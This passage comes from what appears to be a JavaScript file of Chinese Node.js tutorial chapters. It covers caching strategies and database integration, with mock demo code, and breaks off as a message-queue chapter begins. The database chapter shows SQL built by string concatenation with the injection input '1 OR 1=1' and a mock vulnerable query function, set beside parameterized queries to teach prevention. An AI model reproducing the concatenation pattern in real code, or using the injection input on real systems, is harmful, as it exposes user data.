console.log("插入 a=1, b=2, c=3 后:", lru.keys());

// 访问 a，将其移到最新位置
lru.get("a");
console.log("访问 a 后:", lru.keys(), "(a 被移到最新位置)");

// 插入 d，淘汰最旧的 b
lru.put("d", 4);
console.log("插入 d=4 后:", lru.keys(), "(b 被淘汰)");

// 访问不存在的 key
console.log("访问不存在的 b:", lru.get("b")); // -1

// 更新已有 key
lru.put("c", 30);
console.log("更新 c=30 后:", lru.keys());

// 测试容量
console.log("当前缓存大小:", lru.size());

// ---- 2. TTL 缓存实现 ----
console.log("\\n===== 2. TTL 缓存实现 =====");

class TTLCache {
  constructor() {
    this.store = new Map();
  }

  set(key, value, ttlMs) {
    const expireAt = Date.now() + ttlMs;
    this.store.set(key, { value, expireAt });
    // 设置定时器在过期后自动清理
    setTimeout(() => {
      const entry = this.store.get(key);
      if (entry && entry.expireAt <= Date.now()) {
        this.store.delete(key);
      }
    }, ttlMs);
  }

  get(key) {
    const entry = this.store.get(key);
    if (!entry) return undefined;

    // 检查是否过期
    if (entry.expireAt <= Date.now()) {
      this.store.delete(key);
      return undefined;
    }
    return entry.value;
  }

  has(key) {
    const entry = this.store.get(key);
    if (!entry) return false;
    if (entry.expireAt <= Date.now()) {
      this.store.delete(key);
      return false;
    }
    return true;
  }

  size() {
    // 清理过期条目后再返回大小
    const now = Date.now();
    for (const [key, entry] of this.store) {
      if (entry.expireAt <= now) {
        this.store.delete(key);
      }
    }
    return this.store.size;
  }

  clear() {
    this.store.clear();
  }
}

// 测试 TTL 缓存
const ttlCache = new TTLCache();

console.log("设置 key1，TTL 500ms");
ttlCache.set("key1", "value1", 500);
console.log("设置 key2，TTL 2000ms");
ttlCache.set("key2", "value2", 2000);

console.log("立即获取 key1:", ttlCache.get("key1"));
console.log("立即获取 key2:", ttlCache.get("key2"));

// 等待 600ms 后 key1 应该过期
setTimeout(() => {
  console.log("\\n600ms 后:");
  console.log("获取 key1:", ttlCache.get("key1"), "(应已过期)");
  console.log("获取 key2:", ttlCache.get("key2"), "(应仍有效)");
  console.log("key1 是否存在:", ttlCache.has("key1"));
  console.log("key2 是否存在:", ttlCache.has("key2"));
  console.log("当前缓存大小:", ttlCache.size());

  // ---- 3. 缓存策略对比 ----
  console.log("\\n===== 3. 缓存策略对比 =====");

  // 模拟 Cache-Aside 策略
  class CacheAside {
    constructor() {
      this.cache = new Map();
      this.db = new Map(); // 模拟数据库
      this.stats = { hits: 0, misses: 0, dbReads: 0 };
    }

    // 初始化数据库数据
    seedDB(entries) {
      for (const [key, value] of entries) {
        this.db.set(key, value);
      }
    }

    // Cache-Aside 读取
    get(key) {
      // 1. 先查缓存
      if (this.cache.has(key)) {
        this.stats.hits++;
        return this.cache.get(key);
      }

      // 2. 缓存未命中，查数据库
      this.stats.misses++;
      if (this.db.has(key)) {
        this.stats.dbReads++;
        const value = this.db.get(key);
        // 3. 写入缓存
        this.cache.set(key, value);
        return value;
      }

      return null;
    }

    // Cache-Aside 写入（更新数据库，删除缓存）
    set(key, value) {
      this.db.set(key, value);
      this.cache.delete(key); // 删除缓存，下次读取时重新加载
    }

    getStats() {
      return {
        ...this.stats,
        hitRate: (this.stats.hits / (this.stats.hits + this.stats.misses) * 100).toFixed(1) + "%",
        cacheSize: this.cache.size,
      };
    }
  }

  const cacheAside = new CacheAside();
  cacheAside.seedDB([
    ["user:1", { name: "Alice", age: 30 }],
    ["user:2", { name: "Bob", age: 25 }],
    ["user:3", { name: "Charlie", age: 35 }],
  ]);

  console.log("Cache-Aside 策略演示:");
  console.log("第1次请求 user:1 →", cacheAside.get("user:1")); // 缓存未命中，查数据库
  console.log("第2次请求 user:1 →", cacheAside.get("user:1")); // 缓存命中
  console.log("第3次请求 user:1 →", cacheAside.get("user:1")); // 缓存命中
  console.log("请求 user:2 →", cacheAside.get("user:2"));       // 缓存未命中
  console.log("\\n统计数据:", cacheAside.getStats());

  // 更新数据
  cacheAside.set("user:1", { name: "Alice", age: 31 });
  console.log("\\n更新 user:1 后:");
  console.log("请求 user:1 →", cacheAside.get("user:1")); // 缓存已删除，重新查数据库
  console.log("统计数据:", cacheAside.getStats());

  // ---- 4. 缓存击穿与互斥锁防护 ----
  console.log("\\n===== 4. 缓存击穿与互斥锁防护 =====");

  class CacheWithMutex {
    constructor() {
      this.cache = new Map();
      this.db = new Map();
      this.locks = new Map(); // 互斥锁集合
      this.stats = { dbReads: 0, cacheHits: 0 };
    }

    seedDB(entries) {
      for (const [key, value] of entries) {
        this.db.set(key, value);
      }
    }

    // 模拟数据库查询（耗时 100ms）
    async queryDB(key) {
      return new Promise((resolve) => {
        setTimeout(() => {
          this.stats.dbReads++;
          const value = this.db.get(key);
          // 写入缓存，设置 500ms 过期
          this.cache.set(key, { value, expireAt: Date.now() + 500 });
          resolve(value);
        }, 100);
      });
    }

    // 不带互斥锁的读取（缓存击穿风险）
    async getWithoutMutex(key) {
      const cached = this.cache.get(key);
      if (cached && cached.expireAt > Date.now()) {
        this.stats.cacheHits++;
        return cached.value;
      }
      // 直接查数据库——多个并发请求都会走到这里
      return this.queryDB(key);
    }

    // 带互斥锁的读取（防止缓存击穿）
    async getWithMutex(key) {
      const cached = this.cache.get(key);
      if (cached && cached.expireAt > Date.now()) {
        this.stats.cacheHits++;
        return cached.value;
      }

      // 如果已经有请求在加载数据，等待它完成
      if (this.locks.has(key)) {
        console.log("    [请求等待锁释放: " + key + "]");
        return this.locks.get(key); // 返回同一个 Promise
      }

      // 获取锁，开始加载数据
      const loadPromise = this.queryDB(key).finally(() => {
        this.locks.delete(key); // 加载完成后释放锁
      });

      this.locks.set(key, loadPromise);
      return loadPromise;
    }

    // 手动使缓存过期
    expireCache(key) {
      this.cache.delete(key);
    }
  }

  const mutexCache = new CacheWithMutex();
  mutexCache.seedDB([["hot-item", { id: "hot-item", stock: 100 }]]);

  // 模拟缓存击穿场景
  async function simulateCacheBreakdown() {
    console.log("模拟缓存击穿场景：");

    // 先预热缓存
    await mutexCache.getWithMutex("hot-item");
    console.log("缓存预热完成");

    // 手动使缓存过期
    mutexCache.expireCache("hot-item");
    console.log("缓存已过期，5 个并发请求同时到达");

    // 重置统计
    mutexCache.stats.dbReads = 0;
    mutexCache.stats.cacheHits = 0;

    // 5 个并发请求同时到达
    const results = await Promise.all([
      mutexCache.getWithMutex("hot-item"),
      mutexCache.getWithMutex("hot-item"),
      mutexCache.getWithMutex("hot-item"),
      mutexCache.getWithMutex("hot-item"),
      mutexCache.getWithMutex("hot-item"),
    ]);

    console.log("所有请求结果:", results.map((r) => r.stock));
    console.log("数据库查询次数:", mutexCache.stats.dbReads, "(互斥锁保证了只查一次数据库)");
    console.log("如果没有互斥锁，数据库会被查询 5 次");

    // 对比：不带互斥锁的情况
    mutexCache.expireCache("hot-item");
    console.log("\\n对比：不带互斥锁的情况");
    const dbReadsBefore = mutexCache.stats.dbReads;

    await Promise.all([
      mutexCache.getWithoutMutex("hot-item"),
      mutexCache.getWithoutMutex("hot-item"),
      mutexCache.getWithoutMutex("hot-item"),
      mutexCache.getWithoutMutex("hot-item"),
      mutexCache.getWithoutMutex("hot-item"),
    ]);

    console.log("不带互斥锁的数据库查询次数:", mutexCache.stats.dbReads - dbReadsBefore, "(每个请求都查了数据库)");
  }

  simulateCacheBreakdown().then(() => {
    // ---- 5. 缓存穿透防护 ----
    console.log("\\n===== 5. 缓存穿透防护 =====");

    class CacheWithPenetrationProtection {
      constructor() {
        this.cache = new Map();
        this.db = new Map();
        this.nullCache = new Map(); // 缓存空值
        this.stats = { dbReads: 0, nullCacheHits: 0 };
      }

      seedDB(entries) {
        for (const [key, value] of entries) {
          this.db.set(key, value);
        }
      }

      get(key) {
        // 1. 检查缓存
        if (this.cache.has(key)) {
          return this.cache.get(key);
        }

        // 2. 检查空值缓存（防止缓存穿透）
        if (this.nullCache.has(key)) {
          this.stats.nullCacheHits++;
          return null;
        }

        // 3. 查数据库
        this.stats.dbReads++;
        const value = this.db.get(key);

        if (value !== undefined) {
          this.cache.set(key, value);
          return value;
        } else {
          // 4. 缓存空值（TTL 较短，如 30 秒）
          this.nullCache.set(key, true);
          // 30 秒后清除空值缓存
          setTimeout(() => this.nullCache.delete(key), 30000);
          return null;
        }
      }
    }

    const protectCache = new CacheWithPenetrationProtection();
    protectCache.seedDB([
      ["user:1", { name: "Alice" }],
      ["user:2", { name: "Bob" }],
    ]);

    console.log("请求存在的 user:1 →", protectCache.get("user:1"));
    console.log("请求不存在的 user:999 →", protectCache.get("user:999"));
    console.log("再次请求不存在的 user:999 →", protectCache.get("user:999"), "(空值缓存命中，不查数据库)");
    console.log("再次请求不存在的 user:999 →", protectCache.get("user:999"), "(空值缓存命中)");
    console.log("数据库查询次数:", protectCache.stats.dbReads, "(只查询了 2 次)");
    console.log("空值缓存命中次数:", protectCache.stats.nullCacheHits);

    // ---- 6. 缓存雪崩防护：过期时间随机化 ----
    console.log("\\n===== 6. 缓存雪崩防护：过期时间随机化 =====");

    function randomTTL(baseTTL, variance) {
      return baseTTL + Math.floor(Math.random() * variance * 2) - variance;
    }

    console.log("基础 TTL: 3600 秒（1小时）");
    console.log("随机化后的 TTL 示例（10次）:");
    const ttls = [];
    for (let i = 0; i < 10; i++) {
      ttls.push(randomTTL(3600, 300));
    }
    console.log("  " + ttls.join(", "));
    console.log("  最小:", Math.min(...ttls), "秒  |  最大:", Math.max(...ttls), "秒");
    console.log("  所有 TTL 都不同，避免了同时过期导致的雪崩");

    // ---- 7. 缓存策略总结 ----
    console.log("\\n===== 7. 缓存策略总结 =====");
    const summary = [
      { 策略: "Cache-Aside", 场景: "通用场景，最常用", 优点: "实现简单，缓存与DB解耦" },
      { 策略: "Read-Through", 场景: "缓存层封装DB访问", 优点: "应用代码简洁" },
      { 策略: "Write-Through", 场景: "数据一致性要求高", 优点: "缓存与DB一致" },
      { 策略: "Write-Behind", 场景: "写入频繁，可容忍少量丢失", 优点: "写入延迟极低" },
      { 策略: "LRU淘汰", 场景: "热点数据经常变化", 优点: "O(1)操作，实现简单" },
      { 策略: "TTL过期", 场景: "有时效性的数据", 优点: "自动过期，无需手动管理" },
      { 策略: "互斥锁", 场景: "防止缓存击穿", 优点: "减少数据库压力" },
      { 策略: "空值缓存", 场景: "防止缓存穿透", 优点: "避免不存在的key反复查DB" },
    ];
    console.table(summary);
  });
}, 700);`,
  },

  // =========================================================
  // 第五章：数据库集成
  // =========================================================
  {
    id: "node-database",
    title: "数据库集成",
    icon: "💾",
    group: "进阶实战补充",
    content: `## Node.js 数据库生态概览

Node.js 拥有丰富的数据库驱动和 ORM 生态，涵盖关系型数据库（SQL）和非关系型数据库（NoSQL）。

### 主要数据库及驱动

| 数据库 | 类型 | 流行驱动/ORM | 特点 |
| --- | --- | --- | --- |
| **MySQL** | 关系型 SQL | mysql2, Sequelize, Knex | 最流行的开源关系型数据库 |
| **PostgreSQL** | 关系型 SQL | pg, Sequelize, Knex | 功能最强大的开源关系型数据库 |
| **SQLite** | 嵌入式 SQL | better-sqlite3, sqlite3 | 零配置，适合本地开发和小型应用 |
| **MongoDB** | 文档型 NoSQL | mongoose, mongodb | JSON 友好，适合快速原型开发 |
| **Redis** | 键值存储 | ioredis, redis | 内存数据库，极速读写 |

---

## 连接池（Connection Pool）

数据库连接是昂贵的资源——创建连接需要 TCP 握手、认证、SSL 协商等，耗时几十到几百毫秒。**连接池**通过复用连接来避免频繁创建和销毁连接的开销。

### 连接池的工作原理

\`\`\`
              ┌─────────────────────────────────┐
              │          连接池 (Pool)            │
              │  ┌─────┐ ┌─────┐ ┌─────┐        │
   请求到达 → │  │ 空闲 │ │ 空闲 │ │ 使用中│        │ → 数据库
              │  └─────┘ └─────┘ └─────┘        │
              │  ┌─────┐                        │
              │  │ 使用中│                        │
              │  └─────┘                        │
              │  最大连接数: 10                   │
              │  当前使用: 2                      │
              └─────────────────────────────────┘
\`\`\`

### 连接池关键参数

| 参数 | 说明 | 建议值 |
| --- | --- | --- |
| **max** | 最大连接数 | 10-20（取决于数据库服务器能力） |
| **min** | 最小空闲连接数 | 0-2 |
| **idleTimeout** | 空闲连接最大存活时间 | 10000ms（10秒） |
| **acquireTimeout** | 获取连接的最大等待时间 | 30000ms（30秒） |
| **maxUses** | 单个连接最大使用次数 | 0（无限制，但建议设置） |

### 连接池最佳实践

1. **应用启动时创建连接池，全局共享**（不要每次请求创建新的连接池）。
2. **设置合理的 max 值**：太小则并发不足，太大则数据库压力过大。
3. **使用后释放连接**：在 pool.query 中自动管理，手动获取时需调用 release()。
4. **监听连接池事件**：\`acquire\`、\`connection\`、\`release\` 等。
5. **优雅关闭**：应用退出时调用 \`pool.end()\` 关闭所有连接。

---

## ORM vs 原生驱动

### ORM（Object-Relational Mapping）

ORM 将数据库表映射为 JavaScript 对象，用面向对象的方式操作数据库。

**优点**：
- 不需要手写 SQL，降低 SQL 注入风险。
- 数据模型定义清晰，类型安全（配合 TypeScript）。
- 自动处理关联关系（一对一、一对多、多对多）。
- 内置迁移（Migration）和种子数据（Seed）。

**缺点**：
- 性能开销：生成的 SQL 可能不是最优的。
- 学习曲线：每个 ORM 有自己的 API 和概念。
- 复杂查询：对于复杂报表查询，ORM 力不从心，还是需要手写 SQL。

**流行 ORM**：
- **Sequelize**：最成熟的 Node.js ORM，支持 MySQL/PostgreSQL/SQLite/MSSQL。
- **Prisma**：新一代 ORM，自动生成类型，开发体验极佳。
- **TypeORM**：TypeScript 优先的 ORM，装饰器风格。
- **Knex.js**：介于原生驱动和 ORM 之间，SQL 查询构建器。
- **Drizzle ORM**：轻量级 TypeScript ORM，性能优秀。

### 原生驱动

直接使用数据库提供的原生驱动，手写 SQL。

**优点**：
- 性能最优：没有 ORM 层的开销。
- 最大灵活性：完全控制 SQL 语句。
- 适合复杂查询。

**缺点**：
- 需要手写 SQL，容易出错。
- 需要手动处理 SQL 注入防护。
- 代码重复多，维护成本高。

**选择建议**：
- 中小型项目 → ORM（开发效率高）
- 大型项目 → ORM + 原生 SQL 混合使用
- 性能敏感场景 → 查询构建器（Knex）或原生驱动

---

## 事务处理

事务（Transaction）是数据库操作的一个逻辑单元，它包含一组操作，这些操作要么全部成功，要么全部回滚。事务遵循 ACID 原则：

| 特性 | 全称 | 说明 |
| --- | --- | --- |
| **A** | Atomicity（原子性） | 事务中的所有操作要么全部执行，要么全部不执行 |
| **C** | Consistency（一致性） | 事务执行前后，数据库保持一致状态 |
| **I** | Isolation（隔离性） | 并发事务之间互不干扰 |
| **D** | Durability（持久性） | 事务提交后，数据永久保存 |

\`\`\`javascript
// 事务示例：转账操作
const connection = await pool.getConnection();
try {
  await connection.beginTransaction();

  // 从 A 账户扣款
  await connection.query('UPDATE accounts SET balance = balance - 100 WHERE id = ?', [1]);
  // 向 B 账户存款
  await connection.query('UPDATE accounts SET balance = balance + 100 WHERE id = ?', [2]);

  await connection.commit();
} catch (err) {
  await connection.rollback();
  throw err;
} finally {
  connection.release();
}
\`\`\`

---

## SQL 注入防护

SQL 注入是攻击者通过构造恶意输入，篡改 SQL 语句的攻击方式。它是 Web 安全中最常见也最危险的攻击之一。

### 危险的字符串拼接

\`\`\`javascript
// ❌ 极度危险：字符串拼接 SQL
const userId = req.query.id; // 攻击者输入: '1 OR 1=1'
const sql = \`SELECT * FROM users WHERE id = \${userId}\`;
// 实际执行的 SQL: SELECT * FROM users WHERE id = 1 OR 1=1
// 结果：返回所有用户数据！
\`\`\`

### 防护：参数化查询（Parameterized Queries）

**参数化查询**将 SQL 结构和数据分离，数据库驱动会将参数值安全地转义，确保它们不会被当作 SQL 代码执行。

\`\`\`javascript
// ✅ 安全：参数化查询
const userId = req.query.id;
const sql = 'SELECT * FROM users WHERE id = ?';
const [rows] = await connection.query(sql, [userId]);
// 驱动会将 userId 安全转义，不会被当作 SQL 执行
\`\`\`

**参数化查询的工作原理**：
1. 数据库先解析 SQL 结构（占位符 \`?\` 标记参数位置）。
2. 再将参数值绑定到占位符，此时参数值不会被作为 SQL 解析。
3. 因此攻击者无法改变 SQL 的结构。

### 不同数据库的参数化语法

| 数据库 | 占位符语法 | 示例 |
| --- | --- | --- |
| MySQL / MariaDB | \`?\` | \`SELECT * FROM users WHERE id = ?\` |
| PostgreSQL | \`$1, $2, ...\` | \`SELECT * FROM users WHERE id = $1\` |
| SQLite | \`?\` 或 \`$name\` | \`SELECT * FROM users WHERE id = ?\` |

---

## 迁移（Migration）概念

数据库迁移是一种**版本控制**数据库模式（Schema）的方式。它允许你以代码的形式定义数据库结构的变更，并在不同环境中重现这些变更。

### 迁移的优势

1. **版本控制**：每次模式变更都有记录，可以追踪历史。
2. **可重现**：在任何环境（开发、测试、生产）都能重现相同的数据库结构。
3. **可回滚**：如果发现问题，可以回滚到之前的版本。
4. **团队协作**：多人可以同时修改数据库结构，通过迁移文件合并。

### 迁移的工作流程

\`\`\`
1. 创建迁移文件 → 描述需要做的变更（创建表、添加列等）
2. 执行迁移     → 将变更应用到数据库
3. 验证结果     → 检查数据库结构是否符合预期
4. 提交代码     → 将迁移文件提交到版本控制
5. 部署到生产   → 在部署时自动执行迁移
\`\`\`

### 迁移文件示例

\`\`\`javascript
// 迁移文件通常包含 up（正向）和 down（回滚）两个函数
exports.up = async function(knex) {
  await knex.schema.createTable('users', (table) => {
    table.increments('id').primary();
    table.string('name', 100).notNullable();
    table.string('email', 255).unique().notNullable();
    table.timestamps(true, true);
  });
};

exports.down = async function(knex) {
  await knex.schema.dropTable('users');
};
\`\`\`

下面这段代码用对象字面量模拟连接池、参数化查询、事务处理和 ORM 数据模型定义。`,
    code: `// ============================================================
// 第五章代码演示：数据库集成
// ============================================================

// ---- 1. 模拟连接池实现 ----
console.log("===== 1. 模拟连接池实现 =====");

class MockConnectionPool {
  constructor(config = {}) {
    this.config = {
      host: config.host || "localhost",
      port: config.port || 3306,
      maxConnections: config.maxConnections || 10,
      minConnections: config.minConnections || 2,
      idleTimeout: config.idleTimeout || 10000,
    };

    // 连接池状态
    this.available = [];    // 可用连接
    this.inUse = new Set(); // 使用中的连接
    this.waitQueue = [];    // 等待队列
    this.totalCreated = 0;  // 已创建连接总数
    this.nextId = 1;

    // 统计数据
    this.stats = {
      totalQueries: 0,
      totalWaitTime: 0,
      totalAcquired: 0,
      totalReleased: 0,
    };

    // 初始化最小连接数
    for (let i = 0; i < this.config.minConnections; i++) {
      this._createConnection();
    }
  }

  // 创建新连接
  _createConnection() {
    const id = this.nextId++;
    const conn = {
      id,
      createdAt: Date.now(),
      lastUsed: Date.now(),
      isAlive: true,
      query(sql, params) {
        return { sql, params, connectionId: id, executedAt: Date.now() };
      },
    };
    this.available.push(conn);
    this.totalCreated++;
    return conn;
  }

  // 获取连接
  async getConnection() {
    this.stats.totalAcquired++;

    // 如果有可用连接，直接返回
    if (this.available.length > 0) {
      const conn = this.available.pop();
      this.inUse.add(conn);
      conn.lastUsed = Date.now();
      return conn;
    }

    // 如果未达到最大连接数，创建新连接
    if (this.totalCreated < this.config.maxConnections) {
      return new Promise((resolve) => {
        setTimeout(() => {
          const conn = this._createConnection();
          this.available.pop(); // 移除刚创建的
          this.inUse.add(conn);
          resolve(conn);
        }, 10); // 模拟创建连接的开销
      });
    }

    // 连接池已满，需要等待
    return new Promise((resolve) => {
      const waitStart = Date.now();
      this.waitQueue.push((conn) => {
        this.stats.totalWaitTime += Date.now() - waitStart;
        resolve(conn);
      });
    });
  }

  // 释放连接
  release(conn) {
    this.stats.totalReleased++;
    this.inUse.delete(conn);
    conn.lastUsed = Date.now();

    // 如果有等待中的请求，优先满足
    if (this.waitQueue.length > 0) {
      const waiter = this.waitQueue.shift();
      this.inUse.add(conn);
      waiter(conn);
    } else {
      this.available.push(conn);
    }
  }

  // 执行查询（自动管理连接）
  async query(sql, params = []) {
    this.stats.totalQueries++;
    const conn = await this.getConnection();
    try {
      return conn.query(sql, params);
    } finally {
      this.release(conn);
    }
  }

  // 获取连接池状态
  getStatus() {
    return {
      config: this.config,
      available: this.available.length,
      inUse: this.inUse.size,
      waiting: this.waitQueue.length,
      totalCreated: this.totalCreated,
      stats: { ...this.stats },
    };
  }

  // 关闭连接池
  async close() {
    this.available = [];
    this.inUse.clear();
    this.waitQueue = [];
    this.totalCreated = 0;
  }
}

// 测试连接池
const pool = new MockConnectionPool({
  maxConnections: 5,
  minConnections: 1,
});

console.log("连接池创建成功");
console.log("初始状态:", pool.getStatus());

// 模拟并发查询
async function simulateConcurrentQueries() {
  console.log("\\n模拟 10 个并发查询（最大连接数 5）:");

  const queries = [];
  for (let i = 0; i < 10; i++) {
    queries.push(
      pool.query("SELECT * FROM users WHERE id = ?", [i + 1]).then((result) => {
        console.log("  查询 #" + (i + 1) + " 完成:", JSON.stringify(result));
      })
    );
  }

  await Promise.all(queries);

  console.log("\\n连接池最终状态:");
  console.table(pool.getStatus());
  console.log("stats:");
  console.table(pool.getStatus().stats);
}

simulateConcurrentQueries().then(() => {
  // ---- 2. 模拟 SQL 参数化查询 vs 字符串拼接 ----
  console.log("\\n===== 2. SQL 参数化查询 vs 字符串拼接 =====");

  // 模拟数据库
  const mockDB = {
    users: [
      { id: 1, name: "Alice", role: "admin" },
      { id: 2, name: "Bob", role: "user" },
      { id: 3, name: "Charlie", role: "user" },
    ],
  };

  // ❌ 不安全的字符串拼接查询
  function insecureQuery(userInput) {
    const sql = "SELECT * FROM users WHERE id = " + userInput;
    console.log("  拼接的 SQL:", sql);

    // 模拟执行（这里展示攻击效果）
    if (userInput.includes("OR") || userInput.includes("=")) {
      return { sql, result: mockDB.users, warning: "⚠️ SQL 注入成功！返回了所有用户数据！" };
    }

    const id = parseInt(userInput);
    const user = mockDB.users.find((u) => u.id === id);
    return { sql, result: user || null };
  }

  // ✅ 安全的参数化查询
  function secureQuery(userInput, params) {
    const sql = userInput; // SQL 模板，参数位置用 ? 占位
    const paramValue = params[0];

    console.log("  SQL 模板:", sql);
    console.log("  参数值:", paramValue);

    // 参数化查询：参数值不会被当作 SQL 解析
    const id = parseInt(paramValue);
    if (isNaN(id)) {
      return { sql, params, result: null, safe: true };
    }
    const user = mockDB.users.find((u) => u.id === id);
    return { sql, params, result: user, safe: true };
  }

  console.log("--- 不安全查询（字符串拼接）---");
  console.log("正常输入 '1':");
  console.log("  ", insecureQuery("1"));

  console.log("\\n攻击输入 '1 OR 1=1':");
  console.log("  ", insecureQuery("1 OR 1=1"));

  console.log("\\n--- 安全查询（参数化）---");
  console.log("正常输入 '1':");
  console.log("  ", secureQuery("SELECT * FROM users WHERE id = ?", ["1"]));

  console.log("\\n攻击输入 '1 OR 1=1':");
  const secureResult = secureQuery("SELECT * FROM users WHERE id = ?", ["1 OR 1=1"]);
  console.log("  ", secureResult);
  console.log("  ✅ 参数化查询阻止了 SQL 注入！攻击输入 '1 OR 1=1' 被当作普通字符串");

  // ---- 3. 模拟事务处理 ----
  console.log("\\n===== 3. 模拟事务处理 =====");

  class MockTransactionDB {
    constructor() {
      this.accounts = new Map([
        ["A", 1000],
        ["B", 500],
      ]);
      this.transactionLog = [];
    }

    // 开始事务
    beginTransaction() {
      this.snapshot = new Map(this.accounts);
      this.transactionLog.push({ type: "BEGIN", time: Date.now() });
      return { status: "BEGIN" };
    }

    // 执行操作
    execute(sql, params) {
      if (!this.snapshot) throw new Error("事务未开始");

      const [from, to, amount] = params;
      const fromBalance = this.snapshot.get(from) || 0;
      const toBalance = this.snapshot.get(to) || 0;

      if (fromBalance < amount) {
        throw new Error("余额不足: " + from + " 当前余额 " + fromBalance);
      }

      this.snapshot.set(from, fromBalance - amount);
      this.snapshot.set(to, toBalance + amount);

      this.transactionLog.push({
        type: "UPDATE",
        from,
        to,
        amount,
        fromBefore: fromBalance,
        fromAfter: fromBalance - amount,
        toBefore: toBalance,
        toAfter: toBalance + amount,
      });
    }

    // 提交事务
    commit() {
      this.accounts = new Map(this.snapshot);
      this.snapshot = null;
      this.transactionLog.push({ type: "COMMIT", time: Date.now() });
      return { status: "COMMITTED", accounts: this.getAccounts() };
    }

    // 回滚事务
    rollback() {
      this.snapshot = null;
      this.transactionLog.push({ type: "ROLLBACK", time: Date.now() });
      return { status: "ROLLED_BACK", accounts: this.getAccounts() };
    }

    getAccounts() {
      const result = {};
      for (const [key, value] of this.accounts) {
        result[key] = value;
      }
      return result;
    }

    getLog() {
      return this.transactionLog;
    }
  }

  // 测试事务：转账
  async function testTransaction() {
    const db = new MockTransactionDB();
    console.log("初始账户:", db.getAccounts());

    // 成功的事务
    console.log("\\n--- 事务1：A 转账 200 给 B ---");
    db.beginTransaction();
    try {
      db.execute("UPDATE accounts SET balance = balance - ? WHERE name = ?", ["A", "B", 200]);
      db.commit();
      console.log("✅ 事务提交成功");
      console.log("账户:", db.getAccounts());
    } catch (err) {
      db.rollback();
      console.log("❌ 事务回滚:", err.message);
    }

    // 失败的事务（余额不足）
    console.log("\\n--- 事务2：A 转账 5000 给 B（余额不足）---");
    db.beginTransaction();
    try {
      db.execute("UPDATE accounts SET balance = balance - ? WHERE name = ?", ["A", "B", 5000]);
      db.commit();
      console.log("✅ 事务提交成功");
    } catch (err) {
      db.rollback();
      console.log("❌ 事务回滚:", err.message);
      console.log("账户（未变化）:", db.getAccounts());
    }

    console.log("\\n事务日志:");
    console.table(db.getLog());
  }

  testTransaction().then(() => {
    // ---- 4. 模拟 ORM 数据模型定义 ----
    console.log("\\n===== 4. 模拟 ORM 数据模型定义 =====");

    // 模拟 ORM 基础类
    class Model {
      constructor(data = {}) {
        this._data = {};
        this._original = {};
        this._isNew = true;

        // 初始化字段
        for (const [key, value] of Object.entries(this.constructor.schema || {})) {
          this._data[key] = key in data ? data[key] : value.default;
          this._original[key] = this._data[key];
        }
      }

      // 获取字段值
      get(field) {
        return this._data[field];
      }

      // 设置字段值
      set(field, value) {
        // 验证
        const schema = this.constructor.schema[field];
        if (schema && schema.validate) {
          const valid = schema.validate(value);
          if (valid !== true) throw new Error(valid);
        }
        this._data[field] = value;
      }

      // 保存
      save() {
        // 模拟验证所有字段
        for (const [field, schema] of Object.entries(this.constructor.schema)) {
          if (schema.required && !this._data[field]) {
            throw new Error("字段 " + field + " 是必填的");
          }
        }
        this._original = { ...this._data };
        this._isNew = false;
        return this;
      }

      // 转换为 JSON
      toJSON() {
        return { ...this._data };
      }

      // 检查是否有变更
      isDirty() {
        for (const key of Object.keys(this._data)) {
          if (this._data[key] !== this._original[key]) return true;
        }
        return false;
      }

      // 获取变更的字段
      changed() {
        const changed = {};
        for (const key of Object.keys(this._data)) {
          if (this._data[key] !== this._original[key]) {
            changed[key] = { from: this._original[key], to: this._data[key] };
          }
        }
        return changed;
      }

      // 静态方法：定义模型
      static define(schema) {
        class DefinedModel extends this {}
        DefinedModel.schema = schema;
        return DefinedModel;
      }
    }

    // 定义 User 模型
    const User = Model.define({
      id: {
        type: "integer",
        default: null,
        primaryKey: true,
      },
      name: {
        type: "string",
        required: true,
        validate(value) {
          if (typeof value !== "string" || value.length < 2) {
            return "用户名至少需要 2 个字符";
          }
          return true;
        },
      },
      email: {
        type: "string",
        required: true,
        validate(value) {
          if (!/^[\\w.-]+@[\\w.-]+\\.[a-zA-Z]{2,}$/.test(value)) {
            return "邮箱格式不正确";
          }
          return true;
        },
      },
      age: {
        type: "integer",
        default: 0,
        validate(value) {
          if (value < 0 || value > 150) {
            return "年龄必须在 0-150 之间";
          }
          return true;
        },
      },
      role: {
        type: "enum",
        default: "user",
        validate(value) {
          if (!["admin", "user", "guest"].includes(value)) {
            return "角色必须是 admin, user 或 guest";
          }
          return true;
        },
      },
      createdAt: {
        type: "datetime",
        default: new Date().toISOString(),
      },
    });

    // 创建用户实例
    console.log("定义 User 模型:");
    console.log("  字段:", Object.keys(User.schema).join(", "));

    const user = new User({
      name: "Alice",
      email: "alice@example.com",
      age: 30,
      role: "admin",
    });

    console.log("\\n创建用户实例:");
    console.log("  toJSON:", user.toJSON());
    console.log("  是否新记录:", user._isNew);
    console.log("  是否有变更:", user.isDirty());

    user.set("age", 31);
    console.log("\\n修改年龄为 31:");
    console.log("  变更:", user.changed());

    user.save();
    console.log("\\n保存后:");
    console.log("  是否新记录:", user._isNew);
    console.log("  是否有变更:", user.isDirty());

    // 验证测试
    console.log("\\n验证测试:");
    try {
      user.set("name", "A");
    } catch (e) {
      console.log("  设置短名称 → 错误:", e.message);
    }

    try {
      user.set("email", "invalid-email");
    } catch (e) {
      console.log("  设置无效邮箱 → 错误:", e.message);
    }

    try {
      user.set("age", 200);
    } catch (e) {
      console.log("  设置无效年龄 → 错误:", e.message);
    }

    // 测试必填验证
    console.log("\\n必填验证:");
    const incompleteUser = new User({ name: "Bob" });
    try {
      incompleteUser.save();
    } catch (e) {
      console.log("  缺少 email → 错误:", e.message);
    }

    // ---- 5. 数据库集成总结 ----
    console.log("\\n===== 5. 数据库集成总结 =====");
    const summary = [
      { 概念: "连接池", 关键点: "复用连接，避免频繁创建/销毁", 最佳实践: "全局共享，设置合理 max 值" },
      { 概念: "参数化查询", 关键点: "SQL 与数据分离，防止注入", 最佳实践: "永远不要拼接 SQL 字符串" },
      { 概念: "事务", 关键点: "ACID，全部成功或全部回滚", 最佳实践: "try/catch + commit/rollback" },
      { 概念: "ORM", 关键点: "对象映射数据库表", 最佳实践: "中小项目用 ORM，复杂查询手写 SQL" },
      { 概念: "迁移", 关键点: "版本控制数据库模式", 最佳实践: "每次 Schema 变更都创建迁移文件" },
    ];
    console.table(summary);
  });
});`,
  },

  // =========================================================
  // 第六章：消息队列
  // =========================================================
  {
    id: "node-message-queue",
    title: "消息队列",
    icon: "📨",
    group: "进阶实战补充",
    content: `## 什么是消息队列？

